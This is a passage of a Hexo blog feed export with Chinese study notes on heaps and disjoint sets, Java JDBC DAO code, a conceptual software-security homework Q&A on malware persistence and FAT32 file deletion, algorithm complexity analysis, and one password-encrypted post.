<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143353432.png" alt="image-20200306143353432"></p>
<p>存储的方式</p>
<ul>
<li>根节点存在H[1]</li>
<li>节点H[i]左右子节点存在H[2i]、H[2i+1]</li>
<li>节点H[j]父节点为</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143720731.png" alt="image-20200306143720731"></p>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a><strong>基本操作</strong></h3><ul>
<li><p>make-heap   nlog(n) 即</p>
<p>insert</p>
<p>shift-down</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306151812583.png" alt="image-20200306151812583"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306152913995.png" alt="image-20200306152913995"></p>
</li>
<li><p>insert(H,x)   插入所需时间为O(logn)树的高度</p>
</li>
<li><p>delete(H,i)</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145933371.png" alt="image-20200306145933371"></p>
</li>
<li><p>delete-max(H)</p>
</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306143909302.png" alt="image-20200306143909302"></p>
<h3 id="辅助运算"><a href="#辅助运算" class="headerlink" title="辅助运算"></a>辅助运算</h3><ul>
<li>Shift-up</li>
<li>Shift-down</li>
<li></li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306144102573.png" alt="image-20200306144102573"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306144632289.png" alt="image-20200306144632289"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145341282.png" alt="image-20200306145341282"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306145535439.png" alt="image-20200306145535439"></p>
<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306153013519.png" alt="image-20200306153013519"></p>
<ul>
<li>创建最大堆</li>
<li>把根节点与最后一个节点交换</li>
<li>再创建最大堆</li>
<li>再交换</li>
</ul>
<h2 id="不相交集-Disjoint-Sets"><a href="#不相交集-Disjoint-Sets" class="headerlink" title="不相交集(Disjoint Sets)"></a>不相交集(Disjoint Sets)</h2><h3 id><a href="#" class="headerlink" title></a></h3><ul>
<li>每个元素不相同</li>
<li>可以用树表示</li>
</ul>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306155841259.png" alt="image-20200306155841259"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306160011900.png" alt="image-20200306160011900"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306160421170.png" alt="image-20200306160421170"></p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306161050838.png" alt="image-20200306161050838"></p>
<p>路径压缩师，秩不会变</p>
<p><img src="/2020/03/06/2020-03-06-algorithm-2/C:%5CUsers%5C78290%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200306162018074.png" alt="image-20200306162018074"></p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>java笔记2-spring</title>
    <url>/2020/03/03/2020-03-03-JAVA-complement-2/</url>
    <content><![CDATA[<h1 id="JAVA-EE"><a href="#JAVA-EE" class="headerlink" title="JAVA EE"></a>JAVA EE</h1><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>上手参考：<a href="https://www.zybuluo.com/wuxin1994/note/1430332" target="_blank" rel="noopener">https://www.zybuluo.com/wuxin1994/note/1430332</a></p>
<p> <strong>DAO: Data Access Object 数据访问对象</strong></p>
<h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><p>(1).隔离业务逻辑代码和数据访问代码,位于业务逻辑和持久化数据之间，实现对持久化数据的访问。<br>(2).隔离不同数据库的实现。</p>
<h3 id="组成部分："><a href="#组成部分：" class="headerlink" title="组成部分："></a>组成部分：</h3><p>(1).DAO接口<br>(2).DAO实现类<br>(3).实体类<br>(4).数据库连接和关闭工具类</p>
<h3 id="直接上代码"><a href="#直接上代码" class="headerlink" title="直接上代码"></a>直接上代码</h3><p>(1).DAO接口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;public interface DAO &#123;    void findeAll();&#125;</span><br></pre></td></tr></table></figure>

<p>(2).DAO实现类(实体类略去)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.ResultSet;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Author: wufan</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class UerDao implements DAO &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void findeAll() &#123;</span><br><span class="line">        Connection conn &#x3D; null;</span><br><span class="line">        Statement st &#x3D; null;</span><br><span class="line">        ResultSet rs &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F;1. 获取连接对象</span><br><span class="line">            conn &#x3D; JDBCUtil.getConnection();</span><br><span class="line">            &#x2F;&#x2F;2. 创建statement对象</span><br><span class="line">            st &#x3D; conn.createStatement();</span><br><span class="line">            String sql &#x3D; &quot;select * from user&quot;;</span><br><span class="line">            rs &#x3D; st.executeQuery(sql);</span><br><span class="line">            while(rs.next())&#123;</span><br><span class="line">                String phone &#x3D; rs.getString(&quot;phone&quot;);</span><br><span class="line">                int id &#x3D; rs.getInt(&quot;uid&quot;);</span><br><span class="line">                System.out.print(id+&quot;\t&quot;+phone);</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;finally &#123;</span><br><span class="line">            JDBCUtil.release(conn, st, rs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        UerDao ud &#x3D; new UerDao();</span><br><span class="line">        ud.findeAll();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(4).数据库连接和关闭工具类</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package jdbc;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.InputStream;</span><br><span class="line">import java.sql.*;</span><br><span class="line">import java.util.Properties;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Author: wufan</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class JDBCUtil &#123;</span><br><span class="line">    private static String driverClass;</span><br><span class="line">    private static String url;</span><br><span class="line">    private static String username;</span><br><span class="line">    private static String password;</span><br><span class="line">    static&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Properties properties &#x3D; new Properties();</span><br><span class="line">            &#x2F;&#x2F;InputStream is &#x3D; JDBCUtil.class.getClassLoader().getResourceAsStream(&quot;JDBC.properties&quot;);</span><br><span class="line">            InputStream is &#x3D; new FileInputStream(&quot;P:\\Java\\Database\\src\\JDBC.properties&quot;); &#x2F;&#x2F;对应文件位于工程根目录</span><br><span class="line">            properties.load(is);</span><br><span class="line">            driverClass &#x3D; properties.getProperty(&quot;driverClass&quot;);</span><br><span class="line">            url &#x3D; properties.getProperty(&quot;url&quot;);</span><br><span class="line">            username &#x3D; properties.getProperty(&quot;username&quot;);</span><br><span class="line">            password &#x3D; properties.getProperty(&quot;password&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;获取连接</span><br><span class="line">    public static Connection getConnection() &#123;</span><br><span class="line">        Connection conn &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(driverClass);</span><br><span class="line">            conn &#x3D; DriverManager.getConnection(url, username, password);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return conn;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;释放资源</span><br><span class="line">    public static void release(Connection conn, Statement pstmt, ResultSet rs) &#123;</span><br><span class="line">        if (rs !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                rs.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (pstmt !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                pstmt.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (conn !&#x3D; null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125; catch (SQLException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h1 id="spring上手"><a href="#spring上手" class="headerlink" title="spring上手"></a>spring上手</h1><h2 id="挖坑中…-新的坑，新的挑战"><a href="#挖坑中…-新的坑，新的挑战" class="headerlink" title="# 挖坑中….新的坑，新的挑战"></a># 挖坑中….新的坑，新的挑战</h2>]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全第一次作业</title>
    <url>/2020/03/02/2020-03-02-Software-security-notebook-1/</url>
    <content><![CDATA[<h1 id="思考题"><a href="#思考题" class="headerlink" title="思考题"></a>思考题</h1><h3 id="a"><a href="#a" class="headerlink" title="a)"></a>a)</h3><p>Q：恶意软件如何在系统重启、系统重装、以及硬盘更换之后继续获得控制权？</p>
<p>A：</p>
<ul>
<li>重启：BIOS、MBR、DBR、NTLDR、自启动项（文件病毒）。</li>
<li>重装：BIOS、MBR。</li>
<li>硬盘更换：BIOS引导。</li>
</ul>
<h3 id="b"><a href="#b" class="headerlink" title="b)"></a>b)</h3><p>Q：给出在系统重启时恶意软件可以获得控制权的至少5种启动方式（并实践）。哪些方式不需要系统管理员权限？</p>
<p>A：Bios、MBR、DBR、NTLDR、自启动项。</p>
<h3 id="c"><a href="#c" class="headerlink" title="c)"></a>c)</h3><p>Q：每个进程可用4GB内存空间，但有的电脑内存才2G！系统如何做到的？</p>
<p>A：虚拟地址转换物理地址</p>
<h3 id="d"><a href="#d" class="headerlink" title="d)"></a>d)</h3><p>Q：两个进程的可执行程序映像加载地址都是00400000H，但同一地址对应的数据却不一样，为什么？</p>
<p>A：因为是虚拟地址转换成物c理地址，他们的00400000H转换成的物理地址都</p>
<p>不一样（cr3、页目录不一样）</p>
<h3 id="e"><a href="#e" class="headerlink" title="e)"></a>e)</h3><p>Q：PAE模式下，虚拟地址依然只有32位地址，为何可以寻址64G范围内的物理内存?</p>
<ul>
<li>i.内存管理：物理地址扩展（PAE）分页机制<a href="https://blog.csdn.net/trochiluses/article/details/12853027" target="_blank" rel="noopener">https://blog.csdn.net/trochiluses/article/details/12853027</a></li>
<li>ii.PAE分页模式详解：<a href="https://www.cnblogs.com/ck1020/p/6078214.html" target="_blank" rel="noopener">https://www.cnblogs.com/ck1020/p/6078214.html</a> </li>
</ul>
<p>A：分页的方式不同，PAE下，使用32位（2+9+9+12+4个内存目录项）。</p>
<h3 id="f"><a href="#f" class="headerlink" title="f)"></a>f)</h3><p>Q：如果硬盘分区表被完全破坏，如何重构分区表？</p>
<p>A：根据FAT表，以及数据的分布。</p>
<h3 id="g"><a href="#g" class="headerlink" title="g)"></a>g)</h3><p>Q：FAT32系统下文件被删除时，系统具体做了哪些修改？</p>
<p>A：（1）回收箱，文件名首字节变为E5<br>        （2）shift+deltete，文件首字节E5，FAT簇号高位归零，FAT簇链归零</p>
<h3 id="h"><a href="#h" class="headerlink" title="h)"></a>h)</h3><p>Q：数据擦写（安全删除）的原理什么？</p>
<p>A：由于磁盘可以重复使用，前面的数据被后面的数据覆盖后，前面的数据被还原的可能性就大大降低了，随着被</p>
<p>覆盖次数的增多，能够被还原的可能性就趋于 0，但相应的时间支出也就越多。密级要求的高低对应着不同的标</p>
<p>准，低密级要求的就是一次性将磁盘全部覆盖；高密级要求则须进行多次多规则覆盖。覆盖是指使用预先定义的格</p>
<p>式——无意义、无规律的信息来覆盖硬盘上原先存储的数据。</p>
<h3 id="i"><a href="#i" class="headerlink" title="i)"></a>i)</h3><p>Q：在使用数据恢复软件时，为什么标准格式文件（如doc、jpg等）比非格式文件更容易被恢复？</p>
<p>A：应该是，标准文件每部分都有固定的格式，可以方便恢复簇</p>
<h3 id="j"><a href="#j" class="headerlink" title="j)"></a>j)</h3><p>Q：在进行数据恢复时，为何有时候恢复出来的大文件只有前半部分是正确的？</p>
<p>A：因为簇链不连续。</p>
<h3 id="k"><a href="#k" class="headerlink" title="k)"></a>k)</h3><p>Q：恶意代码一定要在文件系统中以文件的方式出现么？它还可以隐藏在哪些区域以躲避被发现和查杀？</p>
<p>A：不一定以文件形式存在。可以隐藏在MBR、bios这些之中。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-28-algorithm-class</title>
    <url>/2020/02/28/2020-02-28-algorithm-class/</url>
    <content><![CDATA[<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200228174457509.png" alt></p>
<a id="more"></a>

<h1 id="概论"><a href="#概论" class="headerlink" title="概论"></a>概论</h1><h3 id="算法是啥？"><a href="#算法是啥？" class="headerlink" title="算法是啥？"></a>算法是啥？</h3><ol>
<li><p>为解决某一问题定义的计算过程。</p>
</li>
<li><p>是通过一个有限的指令序列集合对特定问题进行求解的一种计算执行描述。</p>
</li>
</ol>
<h3 id="算法的性质"><a href="#算法的性质" class="headerlink" title="算法的性质"></a>算法的性质</h3><ul>
<li><p>可行性：可通过基本运算有限次执行来实现。</p>
</li>
<li><p>有穷性：算法的运行步数是有穷（即能运行完出结果的算法，运行不完没有结果有你有何用）</p>
</li>
<li><p>确定性：无二义性。</p>
</li>
<li><p>有输入输出：存在数据处理</p>
</li>
</ul>
<h3 id="程序与算法的区别"><a href="#程序与算法的区别" class="headerlink" title="程序与算法的区别"></a>程序与算法的区别</h3><p>算法的概念与程序十分相似,但实际上有很大不同。程序并不都满足算法所要求的上述特征, 例如有限性特征。算法代表了对特定问题的求 解,而程序则是算法在计算机上的实现。</p>
<h2 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h2><ul>
<li>O；f/g=/=∞</li>
<li></li>
<li></li>
</ul>
<p>举例</p>
<p>二分搜索复杂度为：O(logn)</p>
<p>合并两已排序表：O(n)  n/2-&gt;n-1</p>
<p>选择排序：O(n^2)        n(n-1)/2</p>
<p>插入排序：O(n^2)       最好n-1次，最坏n(n-1)/2</p>
<p>合并排序算法：O(nlogn)</p>
<h3 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h3><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306125945288.png" alt="image-20200306125945288"></p>
<h4 id="（1）O符号-上界"><a href="#（1）O符号-上界" class="headerlink" title="（1）O符号-上界"></a>（1）O符号-上界</h4><p>G越小越好</p>
<p>假设： f (n) 和g(n) 是从<strong>自然数集到非负实数集</strong>里的两个函数</p>
<p>定义1 (O)：如果存在正的常数C和自然数n0，使得当n≥n0时， 有f(n)≤C·g(n)，则称函数f (n) 在n 充分大</p>
<p>时有上有界，且g(n) 是它的一个上界，记做f (n) = O(g(n))</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130222135.png" alt="image-20200306130222135"></p>
<h4 id="（2）Ω符号-下界"><a href="#（2）Ω符号-下界" class="headerlink" title="（2）Ω符号-下界"></a>（2）Ω符号-下界</h4><p>G越小大越好</p>
<p>定义2(Ω)： 如果存在正的常数C 和自然数n0 ， 使得当n ≥ n0时， 有f(n)≥C·g(n)，则称函数f (n) 在n 充分大时有下有界，且g(n) 是它的一个下界，记做f (n) = Ω(g(n))</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130400180.png" alt="image-20200306130400180"></p>
<h4 id="（3）Θ符号-渐进紧确界"><a href="#（3）Θ符号-渐进紧确界" class="headerlink" title="（3）Θ符号-渐进紧确界"></a>（3）Θ符号-渐进紧确界</h4><p>最棒的表述，比O，Ω好</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130554033.png" alt="image-20200306130554033"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130607267.png" alt="image-20200306130607267"></p>
<h4 id="（4）o符号"><a href="#（4）o符号" class="headerlink" title="（4）o符号"></a>（4）o符号</h4><p>与大O符号类似，但是大O符号对于某个大于零的常量c成立，而小o符号则对所有常量c&gt;0成立</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130832478.png" alt="image-20200306130832478"></p>
<h4 id="（5）性质"><a href="#（5）性质" class="headerlink" title="（5）性质"></a>（5）性质</h4><p>传递性：f&lt;g&lt;h；自反性：f=f；对称性：Θ相同；转置对称：f&lt;g==g&gt;f</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306130920867.png" alt="image-20200306130920867"></p>
<h4 id="小问题"><a href="#小问题" class="headerlink" title="小问题"></a>小问题</h4><p>就是说不能说至少</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131333799.png" alt="image-20200306131333799"></p>
<h2 id="估计算法时间复杂度"><a href="#估计算法时间复杂度" class="headerlink" title="估计算法时间复杂度"></a>估计算法时间复杂度</h2><ul>
<li>估计迭代次数</li>
<li>频度分析</li>
<li>使用递归方程</li>
</ul>
<h2 id="数学工具"><a href="#数学工具" class="headerlink" title="数学工具"></a>数学工具</h2><ul>
<li>数学基础</li>
<li>证明方法<ul>
<li>直接证明、间接证明</li>
<li>反证法</li>
<li>数学归纳法</li>
</ul>
</li>
<li>递归方程求解（*）</li>
<li>Master定理（*）</li>
<li>基本数据结构</li>
</ul>
<h3 id="（1）证明方法"><a href="#（1）证明方法" class="headerlink" title="（1）证明方法"></a>（1）证明方法</h3><h4 id="反证法"><a href="#反证法" class="headerlink" title="反证法"></a>反证法</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131942409.png" alt="image-20200306131942409"></p>
<h4 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306131921482.png" alt="image-20200306131921482"></p>
<h3 id="（2）递归方程求解"><a href="#（2）递归方程求解" class="headerlink" title="（2）递归方程求解"></a>（2）递归方程求解</h3><h4 id="常系数递归方程求解"><a href="#常系数递归方程求解" class="headerlink" title="常系数递归方程求解"></a>常系数递归方程求解</h4><p>T有n个就是n-1阶</p>
<p>T(n)=T(n-1)+T(n-2)有2阶</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132041333.png" alt="image-20200306132041333"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132117637.png" alt="image-20200306132117637"></p>
<h4 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h4><ol>
<li>先弄出二阶方程、算出两个根</li>
<li>选择T（n）的<strong>表示法</strong></li>
<li>根据题目给的两个T（n）的值计算C1、C2</li>
<li>最后代入（2）算出T（n）的<strong>表达式</strong>\即时间复杂度</li>
</ol>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132456701.png" alt="image-20200306132456701"></p>
<h3 id="（3）Master定理"><a href="#（3）Master定理" class="headerlink" title="（3）Master定理"></a>（3）Master定理</h3><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132705476.png" alt="image-20200306132705476"></p>
<h4 id="证明："><a href="#证明：" class="headerlink" title="证明："></a>证明：</h4><h4 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132740874.png" alt="image-20200306132740874"></p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306132820314.png" alt="image-20200306132820314"></p>
<p>3/4*Log(n/4)&lt;c *log(n)（c&lt;1，随便取）</p>
<h4 id="练习："><a href="#练习：" class="headerlink" title="练习："></a>练习：</h4><p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306134213863.png" alt="image-20200306134213863"></p>
<p>S(n)=O(n^(1/2-E))    E&gt;0  E取0到1/2</p>
<p><img src="/2020/02/28/2020-02-28-algorithm-class/image-20200306134353096.png" alt="image-20200306134353096"></p>
<p>S(n)=欧米伽(n^(1/2+E))    E&gt;0   E取0到1/2</p>
<p>2*n/4&lt; c *n   c&lt;1   取1/2&lt;c&lt;1</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>-算法</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA 笔记</title>
    <url>/2020/02/26/2020-02-26-JAVA-complement-1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码错误，请重试。\n Oh, this is an invalid password. Check and try again, please." data-whm="解密内容无法验证，但您仍然可以看看。\n Oh, these decrypted content cannot be verified, but you can still have a look."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="加密文章，需要输入密码访问。</br> Hey, password is required here." /><label>加密文章，需要输入密码访问。</br> Hey, password is required here.</label><div class="bottom-line"></div></div><script id="hbeData" type="hbeData" data-hmacdigest="f098b180d0ff5a01d78da21a95c533d27ae75b3c845b467093ae192fb0d2b223">2796aa2617219afdd88cc1d407c460461bb5d187978f8a8a57dba9b64ef15361c3a0a08844ebd498067b63199d1476caa8d2eb217d2558e2c2725adf86d489dee8b674561111894c7c2d16a29cfaed83915a024e920484f5f793897fe1cc04eb40206acb139a4e3fab21478ee425b01536ce5a5fc5ddfb73cc734a6f7ab78ddf349e42e33d95d522a7008ec94038ed093339737a34d57710c9a2aaeb33b1f093f44810a9095d6cf78e4a6b973e55ed32e632abdfed9b157442269dc7c5acc7172d05366171836f42a1248722b4defe7e64123590f3fcce1f0f0184ad04046639c8e3d1219fbe7c7701399d24893638b346a42ce22d706e375493bafabb0c17bafb066e28981d6e57a3ad68d2170d1d55cc4eb0d8e36b96a864bc7fe309947e0fe732a2d785ec552870b01419530d87889d4d40d7c52cb13bfce0c85032783d48014f90b74f537e8f90fe28aa57de638b65544318ba9788d7f93a8d86ed0251ef680f6f88151a9ade4b605e9dc9bb58f2daae0d15bd5e24f634c1582b9ad1533cb1ebcac31a3c14ff858b5a6cd3b1d488b06375477ea456525d11afb1500d021ca4bdcc8c15c3a41445cbbeec09f3fc9da9adcfe395678a4fb80821b11ce850278d131c8f270d43b10105ffc536bb6f36792e408c1b904073ae09fdb9d60b1a0ea65af2d1397ff3b78bb120062260e2355109af44a9a7a0e4cd5f8ca63dc3ff70ef2b968d288360b08391111ca12c49403277ce2b9abd48858aaf9ceb4a157189bec04fd54a4db7f0f90a597ed6dd6e7d786c0ff445b4485defd5af1d8c4036f441ff74e95a66e46557bf7d5c31a49ee51fab5f76aa586b09d0354841f9ea87046f97bddd8ba42d7d2afd10c903f6bde1eef0a89fb57ee58ef800319e361d8431629ce2777a2b663ac05dc8cdd7b6424b90e399cead4fa185d19e6cb1acd121953b142c0438f19d10c432e9227e834c8fe05df1191f3f44dadbd3290df4eec63516f299f43b9cac4eba14d0b4897aaaa48acc483effacc3c36f8084479cb16c91eb8b2843c4951eb819f9b65f124a07fb7b3b83bd29c1c5b3b2c697ff037968d8b92e2e2f16504ebbd4671a43c887af64f92a91c7aea216596af003b97d1daeef4d294d8336030c19758613c3b181d19bcce8f87df1c2857cfdf0665607376cb2acd9b02090b92caa486b0d94133ed3b277d894a6a5a3d25e44d304d9099763b32ccf06cb65a3912fb385968aa85a6fc090aab14358ec5fe2f5dd4c7a95d2a72c1ef88f2287946f799e178263db1078a016595a353924ad76cfc8dede2834ed730ec0c58093c4e7da379af07ba4e5e526c15079071e30a57a623757100d9555d3d10170944c913a502ff4dca7704bb2c75fd39b731230fa1e9ec12007d27918f5b6d672db8d5e9a916610fc54a2c431147ab703475b53862719bc5262050377214b0d9bcc7ad6c08dbeb3472648d941c4facb57087360865a70410dd24967a07a9a40c38f8af17b7e092f8765c1f69def0a8e0ae3096e35a7f832fa5b488c4a421f3fc0cc41e25bb5eda7003a0ef0743f21f7c9bb3dcaf39dbdc6c5cf97b0d35f406be90400dede2a04d57cbec9bd1a48be354cc8cc475312266cd4103aa5f9a908ee2cc809f187fdfd0823470564261e1f507c30eed4d2e38d53705a15d3c27e211ac1b32c15aca24089ac73f73bb6f1e23fd683b56fb8f5486c07a1bb33e2a3ad24e24b41ee43c489eb0837830331bb02c937d1e175fb894a443250e67f79be1b22b9100a0e2a785897f0bdcc4d173441beadabb227265c9d9fe31660636208fcfc3d2acfa0bc088a399087491f24c1e5d3eeabb19a21ebb326a82a489a34254fa46b90bd6dcfbb0261fded3d908ad59b3992598b5c383c80fb69129ec17496b105416e2fcf69ecb546ee7452c3e550dbd26181faa07ce6b821a7e2975d339115d7480e079a35d9bb45c68ba86802b63f18b1d2b19921b1e124f5ddd1c32ea1f3f8b082044db3690916f413179346a2ecc6fc90e145f3355291ac504e8906ffdcbfaa728e9c5f6c7617f8d9d0ca1500706ee5461d86156a2212f0be3eb14c8ab8bc229ef8a67d528b82fe452a8248fdaaf072ee2a7aa5f13ac05e01f418b9ac863d3c1f2833acf8decf60ea360905dbcb75c9e89515ca877cd8023462d5a0166a14eb52cdca33347a8b3bf3d69b4340c0b8e5e704a53d5953dc71a04d91dac2b0e56a07be62e570cad03e3ef3882dcadfe9f91a7ece22249168b966b3d8d41d728313611e2041b67f8624563b44aa5a34ec9892fea1895fa2fba9f41a7eb3212362e09e399a8689cf7b1128f230d734753acd36df642361f3a3ea75790ee095827c81f1f68e697727480db4256f8bbdd58797e34df28e26cfd5c559b5a4330a315e6130f473f96479223408cdbe750fe0bf0bf02da5a94e255a7aafc855350805beab29987af525d48a0b58f4e36bd8968a07ed2c306c191720965017518385ea706e15994bcec3fc4e73b7b0bc5bfca6ecb0aa10a7c01775a93535ea5cdbf078235fe8140eb06ed620e8160a887aa1fc02583947c1d56aff2ad86b90659d8b31a15cd601c523a905ffec85848f41646eaa0f1464a10808d00101506d797ee2dd6d12542f0a74f9e8f3d1e1673bb31abd2ddcd04f6fc7af9ec0416b244d7a9b791a926f7bd47ff77362c6bf82d98d3a1d902573392010cbe49ba575953a56f1e407124d0133ab6da410d664b4bfbf8507de0cf9b22a5e8618382a134d4e646888303e60d853a10d0c052ed7bdbbe07d669482fd90a1597394702e8d5597d48448ed8f0d8d31825aa67509a74a8415ec694a108fa53877f0ab0a475bf8adc119aac1c6a267f20b5876955e1d3171fae9c71eacff7d91dc8f9b572a5ada6a2ccbf35a88e2a9f1ae0b5c1755ccb8f9f23c689c5469da69fd2829c7c5cafc0f32388b2f37d4a2d119fda4cfdf967da3edf14a68c266b04faa3a0718f5cfab622ae68f1bbab88de45431c39d10c3ee2ce3a7c48b0219ac8bd9b41819c76e02861dc70f825095e2ae0e4a558577a8875afe34436fe6c558d68f836e670927f8ec6286d7c4eb3e14b8b7abbab4a2a4786ddc7f4cf93cad7b47f017201ebf1195d207ae73c6f8d64071984e666a1d44fd20a2bf9b1935e6eb994d7652dda16ef7d8f26399994aa4185d48173177cbbb31629fbed3b88a89eadd1e316a1b90d99749c5d4124c14271f631a910e6940178bc8b07f95d753b825634bddf470a1d686634377e408e783a7d72ccebad0d446db45d5fcd607d196503988dfff62addf8b0418bf6a4c2bfeaef57b21c6f2be0e853fa727f82c00fcaab9952a0cf4561177a732b8a14d86413261b11fe5fafd1b4fe6bb1f3b40b8bc8ba7fb9028493b7ae4b1ae9cdaa9af3230cee46ceec3c55d497ae7c9a206cfe269b